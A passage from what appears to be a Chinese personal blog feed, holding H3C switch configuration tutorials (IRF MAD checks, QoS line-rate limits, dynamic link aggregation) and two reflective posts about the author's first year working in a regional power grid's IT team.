<h3 id="验证-2"><a href="#验证-2" class="headerlink" title="验证"></a>验证</h3><p>配置完成后，在<code>SWA</code>上查看MAD信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis mad</span><br><span class="line">MAD ARP disabled.</span><br><span class="line">MAD ND disabled.</span><br><span class="line">MAD LACP enabled.</span><br><span class="line">MAD BFD enabled.</span><br><span class="line">[SWA]dis mad verbose</span><br><span class="line">Multi-active recovery state: No</span><br><span class="line">Excluded ports (user-configured):</span><br><span class="line">Excluded ports (system-configured):</span><br><span class="line">  Ten-GigabitEthernet1/0/49</span><br><span class="line">  Ten-GigabitEthernet2/0/49</span><br><span class="line">MAD ARP disabled.</span><br><span class="line">MAD ND disabled.</span><br><span class="line">MAD LACP enabled interface: Bridge-Aggregation2</span><br><span class="line">  MAD status                : Normal</span><br><span class="line">  Member ID    Port                                    MAD status</span><br><span class="line">  1            GigabitEthernet1/0/1                    Normal</span><br><span class="line">  2            GigabitEthernet2/0/1                    Normal</span><br><span class="line">MAD BFD enabled interface: Vlan-interface3</span><br><span class="line">  MAD status                 : Faulty</span><br><span class="line">  Member ID   MAD IP address       Neighbor   MAD status</span><br><span class="line">  1           192.168.2.1/24       2          Faulty</span><br><span class="line">  2           192.168.2.2/24       1          Faulty</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时在<code>SWA</code>上断掉<strong>Ten1&#x2F;0&#x2F;49</strong>口模拟线缆中断，再从<code>SWA</code>查看MAD信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis mad verbose</span><br><span class="line">Multi-active recovery state: No</span><br><span class="line">Excluded ports (user-configured):</span><br><span class="line">Excluded ports (system-configured):</span><br><span class="line">  Ten-GigabitEthernet1/0/49</span><br><span class="line">MAD ARP disabled.</span><br><span class="line">MAD ND disabled.</span><br><span class="line">MAD LACP enabled interface: Bridge-Aggregation2</span><br><span class="line">  MAD status                : Normal</span><br><span class="line">  Member ID    Port                                    MAD status</span><br><span class="line">  1            GigabitEthernet1/0/1                    Normal</span><br><span class="line">MAD BFD enabled interface: Vlan-interface3</span><br><span class="line">  MAD status                 : Faulty</span><br><span class="line">  Member ID   MAD IP address       Neighbor   MAD status</span><br><span class="line">  1           192.168.2.1/24       2          Faulty</span><br></pre></td></tr></table></figure>

<p>再到<code>SWB</code>上查看MAD信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis mad verbose</span><br><span class="line">Multi-active recovery state: Yes</span><br><span class="line">Excluded ports (user-configured):</span><br><span class="line">Excluded ports (system-configured):</span><br><span class="line">  Ten-GigabitEthernet2/0/49</span><br><span class="line">MAD ARP disabled.</span><br><span class="line">MAD ND disabled.</span><br><span class="line">MAD LACP enabled interface: Bridge-Aggregation2</span><br><span class="line">  MAD status                : Faulty</span><br><span class="line">  Member ID    Port                                    MAD status</span><br><span class="line">  2            GigabitEthernet2/0/1                    Faulty</span><br><span class="line">MAD BFD enabled interface: Vlan-interface3</span><br><span class="line">  MAD status                 : Faulty</span><br><span class="line">  Member ID   MAD IP address       Neighbor   MAD status</span><br><span class="line">  2           192.168.2.2/24       1          Faulty</span><br></pre></td></tr></table></figure>

<p>可以看到此时<code>SWB</code>是<strong>recovery</strong>模式。</p>
<p>回到<code>SWA</code>将线缆恢复，可以看到<code>SWA</code>和<code>SWB</code>又重新堆叠在了一起。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C B00500060 IRF.pptx</li>
<li>H3C IRF2技术原理与应用实践.pptx</li>
<li>H3C S5500V2-EI系列以太网交换机 配置指导-Release 1118-6W100 虚拟化技术配置指导 IRF配置-新华三集团-H3C(<a href="http://www.h3c.com/cn/d_201809/1108188_30005_0.htm">http://www.h3c.com/cn/d_201809/1108188_30005_0.htm</a>)</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>IRF</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day7 H3C设备Qos配置】</title>
    <url>/1020/</url>
    <content><![CDATA[<p>QoS（Quality of Service）即服务质量。对于网络业务，服务质量包括传输的带宽、传送的时延、数据的丢包率等。在网络中可以通过保证传输的带宽、降低传送的时延、降低数据的丢包率以及时延抖动等措施来提高服务质量。</p>
<p>QoS技术包括流分类、流量监管、流量整形、接口限速、拥塞管理、拥塞避免等。其中有些只能通过配置QoS策略来实现QoS功能，有些则可以不通过QoS策略来进行配置。例如，端口限速功能可以通过直接在接口上配置来实现。在实际应用中，两种配置方式也可以结合起来使用。</p>
<p>在H3C模拟器上进行Qos的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="非Qos策略配置方式"><a href="#非Qos策略配置方式" class="headerlink" title="非Qos策略配置方式"></a>非Qos策略配置方式</h1><h2 id="端口限速"><a href="#端口限速" class="headerlink" title="端口限速"></a>端口限速</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>用LR（Line Rate，物理接口限速）可以在一个物理接口上限制发送报文（包括紧急报文）的总速率。</p>
<p>LR也是采用令牌桶进行流量控制。如果在设备的某个接口上配置了LR，所有经由该接口发送的报文首先要经过LR的令牌桶进行处理。如果令牌桶中有足够的令牌，则报文可以发送；否则，报文将进入QoS队列进行拥塞管理。这样，就可以对通过该物理接口的报文流量进行控制。</p>
<p><img src="/1020/1.PNG"></p>
<p>由于采用了令牌桶控制流量，当令牌桶中存有令牌时，可以允许报文的突发性传输；当令牌桶中没有令牌时，报文必须等到桶中生成了新的令牌后才可以继续发送。这就限制了报文的流量不能大于令牌生成的速度，达到了限制流量，同时允许突发流量通过的目的。</p>
<p>与流量监管相比，物理接口限速能够限制在物理接口上通过的所有报文。当用户只要求对所有报文限速时，使用物理接口限速比较简单。</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;H3C&gt;system-view</span><br><span class="line">[H3C]int g1/0/1</span><br><span class="line"></span><br><span class="line">//入口限速1000kbps，出口限速600kbps（突发8000kbps）</span><br><span class="line">[H3C-GigabitEthernet1/0/1]qos lr inbound cir 1000</span><br><span class="line">[H3C-GigabitEthernet1/0/1]qos lr outbound cir 600 cbs 8000</span><br><span class="line"></span><br><span class="line">[H3C-GigabitEthernet1/0/1]dis this</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/1</span><br><span class="line"> port link-mode bridge</span><br><span class="line"> combo enable fiber</span><br><span class="line"> qos lr inbound cir 1000 cbs 62500 //cbs默认是cir的62.5倍</span><br><span class="line"> qos lr outbound cir 600 cbs 8000</span><br><span class="line">#</span><br><span class="line">return</span><br></pre></td></tr></table></figure>

<h1 id="Qos策略配置方式"><a href="#Qos策略配置方式" class="headerlink" title="Qos策略配置方式"></a>Qos策略配置方式</h1><p>QoS策略包含了三个要素：类、流行为、策略。用户可以通过QoS策略将指定的类和流行为绑定起来，灵活地进行QoS配置。</p>
<ol>
<li>类</li>
</ol>
<p>类的要素包括：类的名称和类的规则。</p>
<p>用户可以通过命令定义一系列的规则来对报文进行分类。同时用户可以指定规则之间的关系：and或者or。</p>
<ul>
<li>and：报文只有匹配了所有的规则，设备才认为报文属于这个类。</li>
<li>or：报文只要匹配了类中的任何一个规则，设备就认为报文属于这个类。</li>
</ul>
<ol start="2">
<li>流行为</li>
</ol>
<p>流行为用来定义针对报文所做的QoS动作。</p>
<p>流行为的要素包括：流行为的名称和流行为中定义的动作。</p>
<p>用户可以通过命令在一个流行为中定义多个动作。</p>
<ol start="3">
<li>策略</li>
</ol>
<p>策略用来将指定的类和流行为绑定起来，对分类后的报文执行流行为中定义的动作。</p>
<p>策略的要素包括：策略名称、绑定在一起的类和流行为的名称。</p>
<p>用户可以在一个策略中定义多个类与流行为的绑定关系。</p>
<h2 id="流量监管"><a href="#流量监管" class="headerlink" title="流量监管"></a>流量监管</h2><h2 id="流量整形"><a href="#流量整形" class="headerlink" title="流量整形"></a>流量整形</h2><h2 id="拥塞管理"><a href="#拥塞管理" class="headerlink" title="拥塞管理"></a>拥塞管理</h2><p><em><strong>Qos策略配置之后补充</strong></em></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>QoS技术介绍.H3C(<a href="http://www.h3c.com/cn/d_200805/605881_30003_0.htm">http://www.h3c.com/cn/d_200805/605881_30003_0.htm</a> )</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>Qos</tag>
      </tags>
  </entry>
  <entry>
    <title>【入职一周年总结（一）】</title>
    <url>/1036/</url>
    <content><![CDATA[<p>这个月的封闭学习终于结束了，回头一看入职也刚好一年了，写篇杂谈总结一下这一年的工作与生活。</p>
<p><strong>补充：写完看了下，全是废话流水账，下一篇争取多点干货。</strong></p>
<span id="more"></span>

<h1 id="关于大学"><a href="#关于大学" class="headerlink" title="关于大学"></a>关于大学</h1><p>我本身是比较厌恶上学的，对于知识，我更喜欢是自主学习，而非上课填鸭式教育。</p>
<p>遗憾的是，上了大学，至少在我的大学，课程普遍都是老师上课学生听讲，只有部分相关专业课配套的实验课除外。</p>
<p>所以我是倾向于本科结束拿到学历就工作，不再继续读研的。</p>
<p>然后理想是丰满的，现实总是骨感的。后面慢慢道来。</p>
<h1 id="关于考研"><a href="#关于考研" class="headerlink" title="关于考研"></a>关于考研</h1><p>大学期间非常想去菊花厂，当时也积极参加了菊花厂组织的一些竞赛，也拿到了一些优惠条件，无奈还是能力不足，没有去成。</p>
<p>当时参加的是菊花厂17年7月的大连优招场，结果在8月开始陆续公布，到9月校招结束后全部公布完毕。在等菊花厂的结果期间，看了几个小厂，觉得不是很合适（对本科生条件不是很好，包括岗位工资福利等多方面），8月中第一批没有我的时候，索性就去准备跨考本校CS了。</p>
<p>这时已经8月底了，时间真的是很紧急，只能努力学习。以我不到2个月的备考经验来看，考研需要准备一年真不是玩笑话，起码半年是得有的。</p>
<p>而且考研一定要能坚持住，我9月初和一个室友进驻了一间小自习室，当时差不多有十几人。等我11月初撤的时候，已经不到十个人了。我的室友一直坚持到了最后，也成功上了岸。</p>
<h1 id="关于招聘"><a href="#关于招聘" class="headerlink" title="关于招聘"></a>关于招聘</h1><p>我公司的入职时间相比较其他公司是比较迟的。招聘与入职的跨度就显得非常的长。</p>
<p>10月中的时候，从一个朋友处听说电网要全国巡回校招，其中有我家乡电网。门槛还挺高，强电211本&#x2F;普硕、弱电985本&#x2F;211硕。正好我学的通信，学历也符合，就草草改了下简历，买了车票，去秦皇岛参加了最近一场招聘。</p>
<p>招聘过程几乎没有技术含量，面试官几乎只对你有没有挂科、有没有发论文以及考了什么证感兴趣，同时如果是土著的话，会被特别标记。（仅代表蒙西电网，不代表国网）</p>
<p>当时也没想着要去，所以就比较随意。回来也没当回事，继续备考，只是越学越觉得来不及了。。。</p>
<p>11月初，接到了公司人资的offer电话。好好审视了一下自己，也和熟人了解了一下公司的情况，最后做了逃兵，撤出考研自习室，准备回寝打半年游戏。。。</p>
<p>当然没颓成，打了没几天游戏，就被导师叫去带几个学弟学妹做项目，条件是这个项目当做我的毕设。这个做的还是比较成功的，结果也不错，以后有机会再记录。</p>
<h1 id="关于电网"><a href="#关于电网" class="headerlink" title="关于电网"></a>关于电网</h1><p>说起电网，一般人都只知道国家电网，但是其实地方电网有很多的，不过大都规模很小，毕竟这种企业都是分分合合的。</p>
<p>除了国家电网，其他规模比较大的有南风电网，内蒙古电网（俗称蒙西电网）等等。内蒙古由于地域辽阔，东西分成了两部分，西部电网直属自治区政府，东部电网收归国家电网，其实也仅十年左右。蒙西电网的供电面积和南方电网差不多，但供电人口相差悬殊，因此体量要远小于南方电网。</p>
<p>大家都知道，参加国家电网的招聘需要参加统一的考试，但其实也有例外。我的一个研究生学长也是没有参加统一考试，提前进入的国家电网。相比蒙西电网，国网的招聘门槛只可能更高。蒙西电网也会自己组织统一考试，一般与国网考试时间差不多，但是在统一考试之前，一般会随电力巡回论坛来一波校园招聘，只要学历专业足够硬门槛，都可以去尝试。</p>
<p>而且一个很有趣的现象，在燕大的招聘会上，我也确实看到了部分国网公司的招聘席，虽然大部分都是川贵地区偏远自治州县。</p>
<h1 id="关于入职"><a href="#关于入职" class="headerlink" title="关于入职"></a>关于入职</h1><p>6月底参加完毕业典礼，整个7月都在家中赋闲，直到8月中旬才有通知到公司办理入职手续。但是工资是按7月份开始发的，这么看还是挺良心的。</p>
<p>入职这方面也是挺有槽点的，先到隔壁市总局报道，完事再回市里分局报道，这期间的通知完全就是微信上一句”下午之前“、”明天之前“等等。完全没有时间计划，全按最近一趟车票买。</p>
<p>折腾完这两天就被通知回家等通知，就这种回家等着竟成了下半年最主要的事&#x3D; &#x3D;</p>
<h1 id="关于培训实习"><a href="#关于培训实习" class="headerlink" title="关于培训实习"></a>关于培训实习</h1><p>入职完成后，整个18年下半年，加上春节前，都在培训实习（其实都算不上实习）。</p>
<p>9月初有不到两周的入职培训，其实就是军训（总共训了两天，有一天还下雨）、素拓（贼无聊）、上课（公司的形势、发展、机遇等等）， 总体来看这个培训是没多大意义的。</p>
<p>10月份人资安排了轮岗实习，就是到基层单位轮流岗位实习，熟悉各个岗位的工作内容。公司安排这种实习本意是好的，但是到了基层单位，人家一听是来轮岗的，一周就走，所以基本不会安排工作，毕竟又得教，而且万一出了事故还得承担责任，因此多数人的轮岗都是工位坐着玩手机，偶尔帮忙补补资料。总体来看，这个实习的形式是远大于意义的。</p>
<p>其实这里也是值得管理层多加思考的，很多政策规定本意是好的，但具体实施起来又会有很多问题，只有多做调研、多思考，才能尽量减少这种想当然的情况。</p>
<p>然后从11月中起有6周的专业培训，这个培训是按照专业划分的。我的本科专业是通信工程，工作岗位划分成了通信信息专业。培训内容主要分成了通信部分与信息网络部分。通信部分的课程主要涉及PCM、SDH、光纤光缆等理论以及相关设备的配置；信息网络部分的课程主要涉及计算机网络、TCP&#x2F;IP协议等理论与交换机、路由器等配置。</p>
<p>这个培训是有用的，毕竟各个专业都是培训的实际工作的内容，这样到岗后就能上手工作了。不过时间是偏长的，就拿我的专业培训来说，通信方面我本科只学习过理论，实操方面只做过网线，像PCM设备、SDH设备、网管系统这种都是没操作过的，通过这个培训也确实学到了许多新知识；信息方面我本科理论、实操方面全都学习过，当时实操的配置是6个课时，而放到这里的培训就是足足3周。在班里也确实可以发现大家的水平层次不齐，接收知识的能力也不尽相同，我想这也是把培训时间放这么长的一个重要原因吧。</p>
<h1 id="关于分岗"><a href="#关于分岗" class="headerlink" title="关于分岗"></a>关于分岗</h1><p>专业培训在12月中结束，人资一句回家等通知，大家就都先回家等着下一步的安排了。</p>
<p>可谁能想到，这回家一等，就一直等到了马上过年。。。是的，真就在家坐了一个多月。</p>
<p>应该是年前一周左右吧，具体记不太清了。人资终于想起了我们，通知我们参加分岗大会。分岗按照专业划分，每个专业会有几个可选的基层单位供选择，大家在选择表上填写一志愿与二志愿后提交即可。这个每年都有变化，听说前一年的分岗是按照某个成绩（培训？）排名，一个人一个人的来选单位，这样完全忽视专业的选择确实存在弊端，不过之前一年的新员工培训不分专业就已经很有问题了。</p>
<p>这么看这种分岗方式确实有进步，但弊端就是加大了人资的工作量。而且也确实体现出来了，当晚人资就电话确认了我的志愿，但是直到年后才排出了最终的结果。</p>
<h1 id="关于定岗"><a href="#关于定岗" class="headerlink" title="关于定岗"></a>关于定岗</h1><p>我的一志愿是总局的信通处，年后接到了电话通知，初七（或初九？）报道。</p>
<p>当时就是想着终于要上班了，在家坐了太长的时间，完全都要废了，看着朋友圈里各种996的打卡，我也不知道我该高兴还是羡慕。</p>
<p>到了信通处，首先是两周的安全培训，然后分班组，这才算是正式入职。</p>
<p>这里不得不提一下安全，企业最重要的就是安全，尤其像电网这种高危行业更是重中之重。因此培训也好，实习也罢，我们每到一个地方，首先就是安全培训，目的就是培养大家把安全当做一种习惯。</p>
<p>两周安全培训后，我被分到了信息班，信息班负责全局的信息网络安全方面的维护。但是谁能想到，我竟然是在酒店报到的哈哈哈，住酒店也成了我2019年的主要标签，服了。至于为啥是酒店，写累了，明天再说吧。</p>
<h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>本来是准备写入职后的工作总结的，没想到回头一看，写了这么多废话流水账。算了，歇歇明天再写，下一篇多点干货。</p>
]]></content>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>【入职一周年总结（二）】</title>
    <url>/1037/</url>
    <content><![CDATA[<p>上一篇全写了废话流水账了，这篇我先计划一下，我要记录工作内容、培训内容这些相对干一点的货。</p>
<span id="more"></span>

<h1 id="关于工作"><a href="#关于工作" class="headerlink" title="关于工作"></a>关于工作</h1><p>我的班组主要负责全局几百台（可能上千？）网络设备的维护。详细的来看，既有核心层的交换机、路由器、防火墙等，也有接入层的用户电脑、网络打印机等等。</p>
<p>这里画一个草图，大致就是通信信息网络中各设备的位置。当然位置不唯一，多数是这样连接的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">st=&gt;start: PC</span><br><span class="line">e=&gt;end: PC</span><br><span class="line">op2=&gt;operation: 网络设备</span><br><span class="line">op3=&gt;operation: 通信设备</span><br><span class="line">op4=&gt;operation: 通信设备</span><br><span class="line">op5=&gt;operation: 网络设备</span><br><span class="line">io=&gt;inputoutput: 光纤</span><br><span class="line"></span><br><span class="line">st(right)-&gt;op2(right)-&gt;op3(right)-&gt;io(right)-&gt;op4(right)-&gt;op5(right)-&gt;e</span><br></pre></td></tr></table></figure>


<p>我的理解是在信通处，通信班负责通信设备，光纤班负责光缆光纤，信息班负责网络设备以及用户端的联网设备。</p>
<p>因此，信息班的任务多是面向用户的，这样不免会见到各种奇奇怪怪的问题。</p>
<p>就说一个我自身的经历。我在上班的第一天，接到的第一个工单是某电脑蓝屏进不了系统。过去排查后，发现是BIOS启动项默认第一位是USB，该用户新购置的无线键鼠接收器中内置有存储器，因此主机选择无线接收器进行启动，因为存储器中没有系统引导文件（我估计就内置了一个无线驱动），所以无法进入系统导致蓝屏。处理方法也很简单，修改BIOS启动顺序为硬盘优先即可。</p>
<p>多逼逼一句，严格来讲，这个不算是网络问题，不该我们处理的，但是用户报无法上网的申请，到时候就说电脑开不了机所以上不了网，那也没办法。</p>
<p>然而除了这种技术问题以外，更多的是让人哭笑不得的问题。</p>
<p>某天，接到一个浏览器打不开网页的服务申请，到了一看，新装了个浏览器，这个浏览器也是一朵奇葩，点击网页后在新选项卡中加载，但是却不自动跳转到新选项卡，结果用户开了几十个选项卡，也依旧以为浏览器或者网络坏了。</p>
<p>更有甚者，某天接到一个怀疑word中病毒的申请，到了一看，随便打开一个word都在不停回车，用户认为自己中了病毒，十分恐慌，结果原因呢？我猜聪明的你已经猜到了，是的没错，这老哥的书压到小键盘的回车键了&#x3D; &#x3D;</p>
<p>面向用户的大多是网络问题，因为公司统一做了绑定，人机ip这些都是合一的，因此我们处理的工单多数是更换ip、更换主机、更换工位等等导致上不了网。</p>
<p>除了这些，偶尔会有网络设备的改造、更换、升级等项目或者工程，这种虽然都是厂家来做（当甲方就是舒服），但是跟着项目确实也能学到不少新东西。</p>
<p>我的日常工作呢，总结起来就是，大事不多，琐事不断。天天都挺忙，天天都不知道在忙啥。</p>
<h1 id="关于加班"><a href="#关于加班" class="headerlink" title="关于加班"></a>关于加班</h1><p>我的班组上班是正常作息，早8点半，晚5点半，中间两个半小时休息，双休加法定节假日。日常也没有丧心病狂的钉钉打卡，所以大家有事耽搁稍微晚到一会也无大碍。</p>
<p>加班一般是不存在的，除非去下属分局或站点做维护，可能路途遥远，一般是早上走，下午回来，算是加班一中午。再一个就是有些工程的实施要在非工作时间，所以会需要大家下班后开工，我们主要就是起一个监督作用，基本是没有工作量的。</p>
<p>关于加班，并没有特定的加班费，不过可以增加考核分数，多分一点奖金。另外加班的时长可以等额换取调休，这个还是不错的。</p>
<h1 id="关于工资"><a href="#关于工资" class="headerlink" title="关于工资"></a>关于工资</h1><p>外部一直对电网很敌视，普遍的一个声音是”工资高，不干活，全是子弟“。可是说实话，我们基层员工的工资真的是很低的，看我同学去北上广入职的，入职普遍12k-15k，我就拿人家一个零头，这样真的高吗。</p>
<p>电网的优势是稳定，没有裁员，相对996的工作制要轻松一些，但不代表工作内容会少。毕竟多少996的公司是为了996而996，实际真的在工作吗？</p>
<p>而且工资这个数目是应该与消费水平、物价、房价相结合的。其实最直观的就是房价，北上广拼搏的人真的很勇敢，因为我甚至不敢确定他们干到退休能否还完房贷。</p>
<h1 id="关于房价"><a href="#关于房价" class="headerlink" title="关于房价"></a>关于房价</h1><p>放在房价版图里，包头只能算是一个小城市，这边的房价从16年的均价6千左右到现在的8千多，其实涨幅相比其他城市“正常”多了，至少对于这一代刚刚踏入职场，领到基本工资的人来说，还有个盼头。</p>
<p>对于房价，我的看法是，无论政策怎么调控、无论新闻怎么报道，只要到各售楼部瞧瞧就知道了，永远都在涨。一切看跌的都是不愿面对现实，选择逃避。</p>
<p>上周我也买了房，贷了30年房贷，看来接下来很长一段时间都要认真工作，早日还贷了。本身我不想买的一部分原因就是一旦背了房贷，那我几乎就被定在了这个单位，而我还年轻，还不想被套牢。但是总是要面对现实，做决定总得果断。</p>
<h1 id="关于住酒店"><a href="#关于住酒店" class="headerlink" title="关于住酒店"></a>关于住酒店</h1><p>写了这么多才想起来，上一篇埋得坑，该填了。</p>
<p>我为什么刚到班组就是酒店报到呢？这得从公司的普考与比武说起。</p>
<p>总公司每年会举办面向全体基层员工的普考竞赛与面向优秀基层员工的技术比武大赛。一般普考各个专业都会有，比武由于规模比较大，都是各个专业轮着来。就比如信息网络专业，就是隔一年一次。</p>
<p>刚到处里时，新员工一水的211硕，还有最牛批的华电硕。（这里得吐个槽，在电网，华电第一，清北第二，其它都是弟弟。我也真服了，毕竟华电的水货也不少，太过专注于学校其实没多大意义）</p>
<p>当时就感觉这帮人名头够牛批的，介绍也都”毫不谦虚“（笑），所以可能表现的有点强势，再加上帮通信班写了一个做资料整合的脚本【<a href="http://gaoteng17.xyz/1007/">利用python脚本对excel表格目标数据进行自动筛选计数</a>】。后来就被领导指定破格参加今年的普考和比武。</p>
<p>换句话说，我在还没到班组的时候就已经奠定了今年的备考主旋律。</p>
<p>总公司组织的普考、比武这些，到了各个局，都由培训中心来组织安排封闭学习。由于要保证脱产学习，所以一般都会委托三方培训机构联系一些酒店来实行封闭。而今年的封闭从年后我刚到处里就已经开始了，所以3月初我直接带着学习资料就住酒店了。</p>
<p>不过封闭也是阶段性的，由于考试也不是一次就结束，一般在每次考试前，组织一期几周的封闭，完事考完试，回去工作一段时间，等下次考试前，再组织封闭。</p>
<p>这期间，多数封闭都在市里，也有去总公司培训中心培训的经历，有时也会有去厂家培训的机会。像今年6月，就在杭州住了一个月，一边学习，一边双休日把周围景点玩了个遍，也是不错的经历。</p>
<p>上周封闭结束之后，我合计了一下，从3月正式入职算起来，26周里，住酒店住了14周。。。住酒店时间竟然比在单位时间还多，我也真是醉了。每次封闭每次上火，而且还长肉，这是最痛苦的。</p>
<h1 id="关于比武"><a href="#关于比武" class="headerlink" title="关于比武"></a>关于比武</h1><p>技术比武前六名都算是有名次，既有奖金可拿，又会在之后的职业发展中起帮助作用。</p>
<p>之前的计划是定在9月初的，结果总公司举办艺术节、再加上迎接国庆70周年等等一系列事情，推到了十月中，这样就又多了1个多月的准备时间。</p>
<p>本来呢，我是抱着努力比赛，但是无欲无求的态度。但是呢，由于上周买了房，所以这个比赛，我一定要拿到名次，不为别的，就为拿奖金早点还完房贷，就是这么现实。。。</p>
<h1 id="关于下一步的规划"><a href="#关于下一步的规划" class="headerlink" title="关于下一步的规划"></a>关于下一步的规划</h1><p>我们班组的工作，说是信息网络安全三方面，但是其实安全方面的工作真的做的很少，基本装完一套杀毒软件和防火墙就没事了。这样对于有心人来说总会有机可乘的，当然估计也没多少人有这个胆子攻击我们的网络（笑）。</p>
<p>但是可以看出，公司已经在着重安全方面的建设了。7月份公司组织了第一届信息安全竞赛，标准的CTF赛制，看着不免想起了大学时候打ACM的经历，毕竟两个相似的赛制真让人有点手痒。</p>
<p>说起这个CTF赛，本来是安排我去的，结果入职时长不够，不能参加，本来是有点遗憾的，但是回头一想，我也没多少基础，不做准备硬上的话，结果只会更难看。</p>
<p>等比武完事后，在正常巩固网络方面知识的同时，把信息安全相关的知识系统学习一遍，如果明年还有CTF比赛的话，就去检验学习的成果。</p>
<h1 id="关于近期计划"><a href="#关于近期计划" class="headerlink" title="关于近期计划"></a>关于近期计划</h1><p>闭关一个月，努力学习网络知识，比武我一定要拿名次。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>说是写干货，其实也没多少干货，主要我的工作本身就比较水。</p>
<p>但是说实话，我切身感觉到入职之后学到的东西真的要比书本里学到的多。除此之外，工作会让你发现你真正想去学、想去了解的东西。所幸我是喜欢我这份工作的，我也愿意为这份工作学习新的知识。毕竟，解决一个实际问题的愉悦感是解决一道书本上的题远远不能相比的。</p>
]]></content>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习 H3C设备配置链路聚合（补充）】</title>
    <url>/1038/</url>
    <content><![CDATA[<p>补充几个链路聚合的实验。</p>
<p>原文：<a href="http://gaoteng17.xyz/1016/">【信息网络学习day5 H3C设备配置链路聚合】</a></p>
<span id="more"></span>

<h1 id="二层动态聚合"><a href="#二层动态聚合" class="headerlink" title="二层动态聚合"></a>二层动态聚合</h1><h2 id="组网需求"><a href="#组网需求" class="headerlink" title="组网需求"></a>组网需求</h2><ul>
<li><p>Device A与Device B通过各自的二层以太网接口GigabitEthernet1&#x2F;0&#x2F;1～GigabitEthernet1&#x2F;0&#x2F;3相互连接。</p>
</li>
<li><p>在Device A和Device B上分别配置二层动态链路聚合组，并实现设备间VLAN 10和VLAN 20分别互通。</p>
</li>
</ul>
<h2 id="组网图"><a href="#组网图" class="headerlink" title="组网图"></a>组网图</h2><p><img src="/1038/1.PNG"></p>
<h2 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建VLAN 10，并将端口GigabitEthernet1/0/4加入到该VLAN中。</span><br><span class="line">&lt;DeviceA&gt; system-view</span><br><span class="line">[DeviceA] vlan 10</span><br><span class="line">[DeviceA-vlan10] port gigabitethernet 1/0/4</span><br><span class="line">[DeviceA-vlan10] quit</span><br><span class="line"></span><br><span class="line"># 创建VLAN 20，并将端口GigabitEthernet1/0/5加入到该VLAN中。</span><br><span class="line">[DeviceA] vlan 20</span><br><span class="line">[DeviceA-vlan20] port gigabitethernet 1/0/5</span><br><span class="line">[DeviceA-vlan20] quit</span><br><span class="line"></span><br><span class="line"># 创建二层聚合接口1，并配置该接口为动态聚合模式。</span><br><span class="line">[DeviceA] interface bridge-aggregation 1</span><br><span class="line">[DeviceA-Bridge-Aggregation1] link-aggregation mode dynamic</span><br><span class="line">[DeviceA-Bridge-Aggregation1] quit</span><br><span class="line"></span><br><span class="line"># 分别将端口GigabitEthernet1/0/1至GigabitEthernet1/0/3加入到聚合组1中。</span><br><span class="line">[DeviceA] interface gigabitethernet 1/0/1</span><br><span class="line">[DeviceA-GigabitEthernet1/0/1] port link-aggregation group 1</span><br><span class="line">[DeviceA-GigabitEthernet1/0/1] quit</span><br><span class="line">[DeviceA] interface gigabitethernet 1/0/2</span><br><span class="line">[DeviceA-GigabitEthernet1/0/2] port link-aggregation group 1</span><br><span class="line">[DeviceA-GigabitEthernet1/0/2] quit</span><br><span class="line">[DeviceA] interface gigabitethernet 1/0/3</span><br><span class="line">[DeviceA-GigabitEthernet1/0/3] port link-aggregation group 1</span><br><span class="line">[DeviceA-GigabitEthernet1/0/3] quit</span><br><span class="line"></span><br><span class="line"># 配置二层聚合接口1为Trunk端口，并允许VLAN 10和20的报文通过。</span><br><span class="line">[DeviceA] interface bridge-aggregation 1</span><br><span class="line">[DeviceA-Bridge-Aggregation1] port link-type trunk</span><br><span class="line">[DeviceA-Bridge-Aggregation1] port trunk permit vlan 10 20</span><br><span class="line">[DeviceA-Bridge-Aggregation1] quit</span><br></pre></td></tr></table></figure>

<p><code>DeviceB</code>的配置与<code>DeviceA</code>的配置一样。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DeviceA-Bridge-Aggregation1] display link-aggregation verbose</span><br><span class="line">Loadsharing Type: Shar -- Loadsharing, NonS -- Non-Loadsharing</span><br><span class="line">Port: A -- Auto</span><br><span class="line">Port Status: S -- Selected, U -- Unselected, I -- Individual</span><br><span class="line">Flags:  A -- LACP_Activity, B -- LACP_Timeout, C -- Aggregation,</span><br><span class="line">        D -- Synchronization, E -- Collecting, F -- Distributing,</span><br><span class="line">        G -- Defaulted, H -- Expired</span><br><span class="line"></span><br><span class="line">Aggregate Interface: Bridge-Aggregation1</span><br><span class="line">Aggregation Mode: Dynamic</span><br><span class="line">Loadsharing Type: Shar</span><br><span class="line">System ID: 0x8000, 1839-9e73-0300</span><br><span class="line">Local:</span><br><span class="line">  Port                Status  Priority Oper-Key  Flag</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">  GE1/0/1             S       32768    1         &#123;ACDEF&#125;</span><br><span class="line">  GE1/0/2             S       32768    1         &#123;ACDEF&#125;</span><br><span class="line">  GE1/0/3             S       32768    1         &#123;ACDEF&#125;</span><br><span class="line">Remote:</span><br><span class="line">  Actor               Partner Priority Oper-Key  SystemID               Flag</span><br><span 